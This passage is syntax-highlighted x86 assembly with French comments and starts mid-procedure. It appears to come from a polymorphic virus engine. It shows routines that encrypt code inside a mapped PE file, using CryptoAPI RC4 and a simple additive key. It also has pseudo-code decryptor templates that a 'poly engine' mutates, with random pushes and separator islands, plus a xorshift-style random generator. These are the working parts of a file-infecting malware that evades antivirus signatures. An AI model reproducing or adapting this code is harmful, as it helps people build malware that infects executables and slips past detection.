        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">CCreateHash</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">80h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">CHashData</span><span class="sc0">


        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">TAILLE_CLE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">CALG_RC4</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">CDeriveKey</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp4</span><span class="sc4">],</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">code_to_crypt_len</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">code_to_crypt_len</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">vtmp3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc5">call_</span><span class="sc0"> </span><span class="sc5">CEncrypt</span><span class="sc0">

        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">encrypt_cryptoapis</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;ENCRYPT_SIMPLE : encrypteur pour le decrypteur simple</span><span class="sc0">
</span><span class="sc1">;  in  :   edx-&gt;pe header, ebx-&gt;file mapping,  edi--&gt;code to encrypt</span><span class="sc0">
</span><span class="sc1">;  out :   code to encrypt encrypted !</span><span class="sc0">
</span><span class="sc5">encrypt_simple</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">code_to_crypt_len</span><span class="sc4">/</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">es_boucle</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">simple_cle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">es_boucle</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">encrypt_simple</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;============================== PSEUDO DECRYPTEURS =============================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Code des décrypteurs sous forme de pseudo-code, compréhensible apr le poly engine.</span><span class="sc0">
</span><span class="sc1">;Chaque pseudo-code est en fait un appel à une transformation définie dans le fichier</span><span class="sc0">
</span><span class="sc1">;regles.kpasm</span><span class="sc0">

</span><span class="sc5">pseudo_decrypteur_cryptoapis</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">cryptoapis_init</span><span class="sc0">

        </span><span class="sc1">;cryptacquirecontext</span><span class="sc0">
        </span><span class="sc5">random_pushs_api</span><span class="sc0">
        </span><span class="sc5">push_next_location</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc5">CRYPT_VERIFYCONTEXT</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc5">PROV_RSA_FULL</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">push_cst_csp</span><span class="sc0">
        </span><span class="sc5">call_api</span><span class="sc0"> </span><span class="sc5">A32_CRYPTACQUIRECONTEXTA</span><span class="sc0">
        </span><span class="sc5">retour</span><span class="sc0">
        </span><span class="sc5">ILOT_SEPARATEUR</span><span class="sc0">

        </span><span class="sc1">;cryptcreatehash</span><span class="sc0">
        </span><span class="sc5">random_pushs_api</span><span class="sc0">
        </span><span class="sc5">push_next_location</span><span class="sc0">
        </span><span class="sc5">push_cst_hash</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc5">CALG_MD5</span><span class="sc0">
        </span><span class="sc5">push_mem_csp</span><span class="sc0">
        </span><span class="sc5">call_api</span><span class="sc0"> </span><span class="sc5">A32_CRYPTCREATEHASH</span><span class="sc0">
        </span><span class="sc5">retour</span><span class="sc0">
        </span><span class="sc5">ILOT_SEPARATEUR</span><span class="sc0">

        </span><span class="sc1">;crypthashdata</span><span class="sc0">
        </span><span class="sc5">random_pushs_api</span><span class="sc0">
        </span><span class="sc5">push_next_location</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc5">push_mem_position_cle</span><span class="sc0">
        </span><span class="sc5">push_mem_hash</span><span class="sc0">
        </span><span class="sc5">call_api</span><span class="sc0"> </span><span class="sc5">A32_CRYPTHASHDATA</span><span class="sc0">
        </span><span class="sc5">retour</span><span class="sc0">
        </span><span class="sc5">ILOT_SEPARATEUR</span><span class="sc0">

        </span><span class="sc1">;cryptderivekey</span><span class="sc0">
        </span><span class="sc5">random_pushs_api</span><span class="sc0">
        </span><span class="sc5">push_next_location</span><span class="sc0">
        </span><span class="sc5">push_cst_key</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc5">TAILLE_CLE</span><span class="sc0">
        </span><span class="sc5">push_mem_hash</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc5">CALG_RC4</span><span class="sc0">
        </span><span class="sc5">push_mem_csp</span><span class="sc0">
        </span><span class="sc5">call_api</span><span class="sc0"> </span><span class="sc5">A32_CRYPTDERIVEKEY</span><span class="sc0">
        </span><span class="sc5">retour</span><span class="sc0">
        </span><span class="sc5">ILOT_SEPARATEUR</span><span class="sc0">

        </span><span class="sc1">;cryptdecrypt</span><span class="sc0">
        </span><span class="sc5">random_pushs_api</span><span class="sc0">
        </span><span class="sc5">push_mem_offset_code</span><span class="sc0">
        </span><span class="sc5">push_cst_taille_code</span><span class="sc0">
        </span><span class="sc5">push_mem_offset_code</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc5">push_cst</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">push_mem_key</span><span class="sc0">
        </span><span class="sc5">call_api</span><span class="sc0"> </span><span class="sc5">A32_CRYPTDECRYPT</span><span class="sc0">
        </span><span class="sc5">retour</span><span class="sc0">
        </span><span class="sc5">ILOT_SEPARATEUR</span><span class="sc0">
        </span><span class="sc5">FIN_DECRYPTEUR</span><span class="sc0">

</span><span class="sc5">NB_PARTIES_DECRYPTEUR_INITIAL_CRYPTOAPIS</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">poly_ca_peheader</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">pseudo_decrypteur_simple</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">simple_init</span><span class="sc0">

        </span><span class="sc5">simple_init_registres</span><span class="sc0">
        </span><span class="sc5">simple_lit</span><span class="sc0">
        </span><span class="sc5">simple_decrypte</span><span class="sc0">
        </span><span class="sc5">simple_ecrit</span><span class="sc0">
        </span><span class="sc5">simple_boucle</span><span class="sc0">
        </span><span class="sc5">simple_saut</span><span class="sc0">
        </span><span class="sc5">ILOT_SEPARATEUR</span><span class="sc0">
        </span><span class="sc5">FIN_DECRYPTEUR</span><span class="sc0">

</span><span class="sc5">NB_PARTIES_DECRYPTEUR_INITIAL_SIMPLE</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc1">;============================== MISC ============================</span><span class="sc0">
</span><span class="sc5">rand_tuna</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">    </span><span class="sc1">;in: eax=val max   out: eax=rand()</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RAND_SEED</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;on initialise eax avec la "graine"</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;on copie eax dans ebx c-a-d RAND_SEED</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc0">          </span><span class="sc1">;eax = (n &lt;&lt; D2) = res1</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;eax = (res1 ^ n) = res2</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">19</span><span class="sc0">          </span><span class="sc1">;eax = (res2 &gt;&gt; D3) = res3</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4294967294</span><span class="sc0">  </span><span class="sc1">;ebx = (n &amp; E) = res4</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">12</span><span class="sc0">          </span><span class="sc1">;ebx = (res4 &lt;&lt; D1) = res5</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">;eax = (res5 ^ res3) = resultat final</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">RAND_SEED</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">;on sauvegarde le resultat final</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">;fini, vous trouvez le npa dans RANDOM_SEED</span><span class="sc0">
</span><span class="sc5">rand_tuna</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">
</span></div></body>
</html>
